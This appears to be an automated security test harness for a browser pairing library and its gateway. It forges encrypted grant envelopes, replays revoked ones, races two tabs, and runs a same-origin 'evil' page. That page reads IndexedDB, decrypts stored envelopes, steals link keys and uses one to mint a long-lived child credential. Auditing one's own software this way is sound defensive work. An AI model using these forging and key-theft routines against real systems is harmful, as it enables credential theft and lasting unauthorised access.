// A5: the page (real connect.js in Chromium, ravi.page CSP, local-network permission) against a real gateway.
// Forged envelopes from the public request text, extra installation, caps outside the preset, replay after disconnect,
// two tabs, IndexedDB per state, forget, and what a second route on the same origin can do.
const L = require("./lib.cjs");
const { fs, path, rec, mkHome, pair, errc, startGateway, gw, write0600, ORIGIN, webcrypto, b64u } = L;
const { chromium } = require("playwright");
const CSP = "base-uri 'self'; object-src 'none'; frame-ancestors 'none'; upgrade-insecure-requests";
async function seal(reqText, grantExtra, hashOverride) {
  const raw = Buffer.from(reqText.slice("ravi-connect:v1:".length), "base64url").toString();
  const r = JSON.parse(raw);
  const hash = hashOverride || Buffer.from(await webcrypto.subtle.digest("SHA-256", Buffer.from(raw))).toString("base64url");
  const pub = await webcrypto.subtle.importKey("jwk", { kty: "EC", crv: "P-256", x: r.pub.x, y: r.pub.y, ext: true }, { name: "ECDH", namedCurve: "P-256" }, false, []);
  const eph = await webcrypto.subtle.generateKey({ name: "ECDH", namedCurve: "P-256" }, true, ["deriveBits"]);
  const bits = await webcrypto.subtle.deriveBits({ name: "ECDH", public: pub }, eph.privateKey, 256);
  const hk = await webcrypto.subtle.importKey("raw", bits, "HKDF", false, ["deriveKey"]);
  const aes = await webcrypto.subtle.deriveKey({ name: "HKDF", hash: "SHA-256", salt: Buffer.from(hash, "base64url"), info: Buffer.from("ravi-connect-v1") }, hk, { name: "AES-GCM", length: 256 }, false, ["encrypt"]);
  const iv = webcrypto.getRandomValues(new Uint8Array(12));
  const g = { v: 1, origin: r.origin, hash, preset: r.preset, ...grantExtra };
  const ct = await webcrypto.subtle.encrypt({ name: "AES-GCM", iv, additionalData: Buffer.from(`ravi-connect-v1|${hash}|${r.origin}`) }, aes, Buffer.from(JSON.stringify(g)));
  const epk = await webcrypto.subtle.exportKey("jwk", eph.publicKey);
  return "ravi-envelope:v1:" + b64u(Buffer.from(JSON.stringify({ v: 1, h: hash, epk: { x: epk.x, y: epk.y }, iv: b64u(iv), ct: b64u(Buffer.from(ct)) })));
}
(async () => {
  const G = await startGateway(47904, "page");
  const A = G.url;
  const cfg = { allowedOrigins: [ORIGIN], linkTtlDays: 60, installations: { local: { baseUrl: A, reach: { type: "http", url: A, issuerKeyFile: "~/.ravi/pairing/issuer.key" }, scope: { sessions: ["outro-main"], agents: ["outro"] } } } };
  const h = mkHome("page", cfg);
  const caps = pair(h, ["caps", "local"]).out.trim();
  const iss = await gw(A, "context/issue", G.admin, { cliName: "pairing-issuer", allow: caps, ttl: "89d" });
  write0600(path.join(h.dir, "issuer.key"), iss.json.contextKey + "\n");
  const ACC = ["read:context:whoami", "read:sessions:list", "read:sessions:info", "read:agents:list", "access:session:outro-main", "view:agent:outro"];
  // an attacker-held key on the owner's gateway (e.g. an org member with their own approved link, or any leaked one)
  const atk = await gw(A, "context/issue", iss.json.contextKey, { cliName: "attacker-own", allow: "mutate:context:issue," + ACC.join(","), ttl: "30d" });
  const page = (names) => `<!doctype html><meta charset=utf-8><div id=c></div><script type=module>
import { createConnect, storedSummary } from '/connect.js';
const conn = createConnect({ installations: ${JSON.stringify(names)}, preset: "ver", labels: {} });
conn.mount(document.getElementById("c")); window.conn = conn; window.storedSummary = storedSummary;
window.ready = conn.session().then((x) => (window.insts = x));
</script>`;
  const evil = `<!doctype html><meta charset=utf-8><script type=module>
const db = await new Promise((res) => { const q = indexedDB.open("ravi-connect"); q.onsuccess = () => res(q.result); });
const links = await new Promise((res) => { const q = db.transaction("kv").objectStore("kv").get("links"); q.onsuccess = () => res(q.result || []); });
const { unb64u } = await import("/connect.js");
const out = [];
for (const l of links) {
  const env = l.envelope;
  const epk = await crypto.subtle.importKey("jwk", { kty: "EC", crv: "P-256", x: env.epk.x, y: env.epk.y, ext: true }, { name: "ECDH", namedCurve: "P-256" }, false, []);
  const bits = await crypto.subtle.deriveBits({ name: "ECDH", public: epk }, l.privateKey, 256);
  const hk = await crypto.subtle.importKey("raw", bits, "HKDF", false, ["deriveKey"]);
  const aes = await crypto.subtle.deriveKey({ name: "HKDF", hash: "SHA-256", salt: unb64u(l.hash), info: new TextEncoder().encode("ravi-connect-v1") }, hk, { name: "AES-GCM", length: 256 }, false, ["decrypt"]);
  const pt = await crypto.subtle.decrypt({ name: "AES-GCM", iv: unb64u(env.iv), additionalData: new TextEncoder().encode("ravi-connect-v1|" + l.hash + "|" + l.request.origin) }, aes, unb64u(env.ct));
  out.push(JSON.parse(new TextDecoder().decode(pt)));
}
window.stolen = out.map((g) => g.installs.map((i) => ({ name: i.name, baseUrl: i.baseUrl, linkKey: i.linkKey }))).flat();
</script>`;
  const browser = await chromium.launch();
  const ctx = await browser.newContext();
  await ctx.grantPermissions(["local-network-access"], { origin: ORIGIN }).catch(() => {});
  let names = { local: A };
  await ctx.route(`${ORIGIN}/**`, (route) => {
    const u = new URL(route.request().url());
    if (u.pathname === "/connect.js") return route.fulfill({ status: 200, contentType: "text/javascript", headers: { "content-security-policy": CSP }, body: fs.readFileSync(L.CONNECT_JS, "utf8") });
    if (u.pathname === "/evil") return route.fulfill({ status: 200, contentType: "text/html", headers: { "content-security-policy": CSP }, body: evil });
    return route.fulfill({ status: 200, contentType: "text/html", headers: { "content-security-policy": CSP }, body: page(names) });
  });
  const visit = async (p0) => { const p = p0 || (await ctx.newPage()); p.on("pageerror", (e) => console.error("pageerror", e.message)); await p.goto(ORIGIN + "/"); await p.waitForFunction(() => window.ready); await p.evaluate(() => window.ready); return p; };
  const dump = (p) => p.evaluate(async () => { const db = await new Promise((r) => { const q = indexedDB.open("ravi-connect"); q.onsuccess = () => r(q.result); }); const tx = db.transaction("kv"); const s = tx.objectStore("kv"); const keys = await new Promise((r) => { const q = s.getAllKeys(); q.onsuccess = () => r(q.result); }); const vals = await new Promise((r) => { const q = s.getAll(); q.onsuccess = () => r(q.result); }); db.close(); const t = JSON.stringify(vals, (k, x) => (x instanceof CryptoKey ? { cryptoKey: x.extractable } : x)); return { keys, rctx: t.includes("rctx_"), links: (vals[keys.indexOf("links")] || []).length, dbs: (await indexedDB.databases()).map((d) => d.name), ls: localStorage.length }; });
  const states = (p) => p.evaluate(() => Object.fromEntries(window.conn.snapshot().map((s) => [s.name, s.state])));
  const idb = {};
  try {
    const p = await visit();
    idb.notLinked = await dump(p);
    // ---------- legit connect
    await p.evaluate(() => window.conn.connect());
    idb.pending = await dump(p);
    const req1 = await p.evaluate(() => window.conn.pending.text);
    const c1 = pair(h, ["check", req1, "--json"]);
    const a1 = pair(h, ["approve", req1, "--phrase", c1.json.phrase, "--json"]);
    // ---------- forged envelopes for the SAME pending request, built only from the public request text
    const forged = {};
    const tryEnv = async (k, grant, hashOverride) => { const t = await seal(req1, grant, hashOverride); forged[k] = await p.evaluate(async (t) => { try { return "accepted:" + (await window.conn.accept(t)).join(","); } catch (e) { return "refused: " + e.message; } }, t); };
    // non-destructive first (they must be refused, and the pending stays)
    await tryEnv("otherBaseUrl", { installs: [{ name: "local", baseUrl: "http://127.0.0.1:1", linkKey: "rctx_x", contextId: "c", expiresAt: Date.now() + 1e9, caps: ACC }] });
    await tryEnv("extraInstall", { installs: [{ name: "local", baseUrl: A, linkKey: "rctx_x", contextId: "c", expiresAt: 1, caps: ACC }, { name: "vps9", baseUrl: A, linkKey: "rctx_y", contextId: "d", expiresAt: 1, caps: ACC }] });
    await tryEnv("wildcardCap", { installs: [{ name: "local", baseUrl: A, linkKey: "rctx_x", contextId: "c", expiresAt: 1, caps: [...ACC, "access:session:*"] }] });
    await tryEnv("adminCap", { installs: [{ name: "local", baseUrl: A, linkKey: "rctx_x", contextId: "c", expiresAt: 1, caps: [...ACC, "admin:system:*"] }] });
    await tryEnv("sendUnderVer", { installs: [{ name: "local", baseUrl: A, linkKey: "rctx_x", contextId: "c", expiresAt: 1, caps: [...ACC, "mutate:sessions:send"] }] });
    await tryEnv("eventsCap", { installs: [{ name: "local", baseUrl: A, linkKey: "rctx_x", contextId: "c", expiresAt: 1, caps: [...ACC, "view:system:events"] }] });
    await tryEnv("wrongHash", { installs: [] }, b64u(Buffer.alloc(32)));
    rec("PG-forge-refused: forged envelope with other baseUrl / extra installation / wildcard / admin / send under ver / events / other hash", Object.values(forged).every((v) => v.startsWith("refused")) ? "held" : "WEAK", forged);
    // forged envelope that passes: attacker's own key (or garbage), arbitrary expiry, out-of-config scope name
    await tryEnv("attackerKey", { installs: [{ name: "local", baseUrl: A, linkKey: atk.json.contextKey, contextId: "forged", expiresAt: 253402300799000, caps: [...ACC.slice(0, 4), "access:session:segredo"] }] });
    await p.waitForTimeout(300);
    const afterForge = { accept: forged.attackerKey, states: await states(p), card: await p.evaluate(() => document.querySelector("[data-rc-install=local]").textContent), legitEnvelopeStillUsable: null };
    const legit = a1.json.reply.match(/ravi-envelope:v1:[A-Za-z0-9_-]+/)[0];
    afterForge.legitEnvelopeStillUsable = await p.evaluate(async (t) => { try { await window.conn.accept(t); return "accepted"; } catch (e) { return "refused: " + e.message; } }, legit);
    rec("PG-forge-accepted: forged envelope for the pending request (public text + attacker-held key on the owner's gateway, expiry 9999-12-31, scope name outside the config)", !afterForge.accept.startsWith("accepted") ? "held" : String(afterForge.legitEnvelopeStillUsable).startsWith("accepted") ? "known limit (forged envelope accepted, see limites.md; the real envelope of the same request is still accepted afterwards and wins)" : "WEAK (page accepts it, consumes the pending; the real envelope from the agent is then refused)", afterForge);
    // ---------- clean legit connect, then IndexedDB and forget
    await p.evaluate(() => window.conn.connect(true)); // after R8-style recovery local may already be linked
    const req2 = await p.evaluate(() => window.conn.pending.text);
    const c2 = pair(h, ["check", req2, "--json"]);
    const a2 = pair(h, ["approve", req2, "--phrase", c2.json.phrase, "--json"]);
    const env2 = a2.json.reply.match(/ravi-envelope:v1:[A-Za-z0-9_-]+/)[0];
    await p.evaluate(async (t) => window.conn.accept(t), env2);
    idb.linked = await dump(p);
    const p2 = await visit();
    const linkedState = await states(p2);
    // second route on the same origin: steal the link key, use it from Node, mint a long child that outlives everything
    const ev = await ctx.newPage(); await ev.goto(ORIGIN + "/evil"); await ev.waitForFunction(() => window.stolen, null, { timeout: 10000 });
    const stolen = await ev.evaluate(() => window.stolen);
    const sk = stolen.find((s) => s.linkKey && s.linkKey.startsWith("rctx_"));
    const longChild = sk ? await gw(A, "context/issue", sk.linkKey, { cliName: "x", allow: "mutate:context:issue,read:context:whoami,read:sessions:list,access:session:outro-main", ttl: "59d" }) : null;
    rec("PG-evil-route: second route on the same origin reads IndexedDB, opens the envelope, uses the link from outside the browser", sk && longChild && longChild.status === 200 ? "demonstrated (known limit, limites.md)" : "held", { stolenInstalls: stolen.length, childStatus: longChild && longChild.status, childDays: longChild && longChild.json && ((longChild.json.expiresAt - Date.now()) / 864e5).toFixed(1) });
    // forget: browser side cleared? in-memory handles?
    const fg = await p2.evaluate(async () => { const before = window.insts.find((i) => i.state === "linked"); await window.conn.forget(); let call; try { call = (await before.call("context/whoami")).issuedFor; } catch (e) { call = "refused: " + e.message; } return { call, snapshot: window.conn.snapshot() }; });
    idb.afterForget = await dump(p2);
    rec("PG-forget: after 'Esquecer este navegador' (same tab)", fg.call && !String(fg.call).startsWith("refused") ? "WEAK (IndexedDB emptied, but installation handles returned by session() keep a live link + access key in memory and still call the gateway; the stolen child and the link stay valid on the gateway)" : "held", { afterForgeCall: fg.call, idb: idb.afterForget, childStillValid: longChild && (await gw(A, "context/whoami", longChild.json.contextKey)).status });
    // ---------- replay old envelope after disconnect
    await p2.evaluate(() => window.conn.connect());
    const req3 = await p2.evaluate(() => window.conn.pending.text);
    const c3 = pair(h, ["check", req3, "--json"]);
    const a3 = pair(h, ["approve", req3, "--phrase", c3.json.phrase, "--json"]);
    const env3 = a3.json.reply.match(/ravi-envelope:v1:[A-Za-z0-9_-]+/)[0];
    await p2.evaluate(async (t) => window.conn.accept(t), env3);
    await gw(A, "context/revoke", G.admin, { contextId: a3.json.installs[0].contextId, reason: "disconnect" });
    const p3 = await visit();
    const afterRevoke = await states(p3);
    await p3.evaluate(() => window.conn.connect());
    const replay = await p3.evaluate(async (ts) => Promise.all(ts.map(async (t) => { try { await window.conn.accept(t); return "accepted"; } catch (e) { return "refused: " + e.message.slice(0, 40); } })), [env3, env2, legit]);
    const afterReplay = await states(p3);
    // a request younger than 15 minutes keeps its key, so its (revoked) envelope opens again: harmless if the page stays 'reconnect'
    rec("PG-replay: old envelopes pasted after disconnect (new pending)", afterRevoke.local === "reconnect" && afterReplay.local === "reconnect" && replay.slice(1).every((r) => r.startsWith("refused")) ? (replay[0] === "accepted" ? "held (the revoked envelope of a request under 15 minutes opens again, but its link is revoked: still 'precisa reconectar'; older ones refused)" : "held") : "WEAK", { afterRevoke, replay, afterReplay });
    await p3.evaluate(() => window.conn.cancel());
    // ---------- two tabs with pending requests
    await p3.evaluate(() => window.conn.forget());
    const t1 = await visit(); const t2 = await visit();
    await t1.evaluate(() => window.conn.connect());
    await t2.evaluate(() => window.conn.connect());
    const r1 = await t1.evaluate(() => ({ text: window.conn.pending.text, phrase: window.conn.pending.phrase }));
    const r2phrase = await t2.evaluate(() => window.conn.pending.phrase);
    const c4 = pair(h, ["check", r1.text, "--json"]);
    const a4 = pair(h, ["approve", r1.text, "--phrase", c4.json.phrase, "--json"]);
    const env4 = a4.json.reply.match(/ravi-envelope:v1:[A-Za-z0-9_-]+/)[0];
    await t1.fill("textarea[data-rc=envelope]", env4); await t1.click("button[data-rc=paste]"); await t1.waitForTimeout(500);
    const tab1Msg = await t1.textContent("[data-rc=status]");
    rec("PG-two-tabs: tab 1 and tab 2 both click Conectar; owner approves tab 1's request (phrase shown in tab 1)", /recusado/i.test(tab1Msg) ? "WEAK (single 'pending' slot in IndexedDB: tab 2 overwrote tab 1's key; tab 1 refuses its own approved envelope and a 60-day link is left live and unused)" : "held", { tab1Phrase: r1.phrase, tab2Phrase: r2phrase, tab1Status: tab1Msg, approve: errc(a4) });
    // ---------- 'constructor' as an installation name in the page
    names = { constructor: A };
    const pc = await visit();
    rec("PG-proto-name: installation named 'constructor' in createConnect", "info", await pc.textContent("[data-rc-install=constructor]"));
    rec("PG-idb: IndexedDB per state (keys, rctx_ in clear?)", Object.values(idb).every((d) => !d.rctx) ? "held" : "WEAK", idb);
  } finally {
    await browser.close(); G.stop(); L.save("a5-results.json");
  }
})().catch((e) => { console.error(e); L.save("a5-results.json"); process.exit(1); });
